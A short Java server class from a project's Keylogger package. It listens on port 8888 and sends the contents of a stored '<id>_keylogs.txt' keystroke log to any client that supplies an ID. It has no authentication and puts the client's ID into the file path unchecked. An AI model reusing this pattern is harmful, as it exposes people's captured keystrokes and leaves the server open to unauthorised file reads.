package com.server.liveowl.Keylogger;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

public class FTPServerSetup {
public static void main(String[] args) throws Exception {
    ServerSocket server = new ServerSocket(8888);
    System.out.println("Server đã sẵn sàng lắng nghe...");

    while (true) {
        try (Socket soc = server.accept();
             DataInputStream dis = new DataInputStream(soc.getInputStream());
             DataOutputStream dos = new DataOutputStream(soc.getOutputStream())) {

            // Nhận ID từ client
            String id = dis.readUTF();
            String filePath = "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger/" + id + "_keylogs.txt";

            // Mở tệp và gửi từng dòng cho client
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(filePath)))) {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    dos.writeUTF(line);
                }
                dos.writeUTF("EOF");
            }
        } catch (Exception e) {
            System.out.println("Lỗi: " + e.getMessage());
        }
    }
}
}
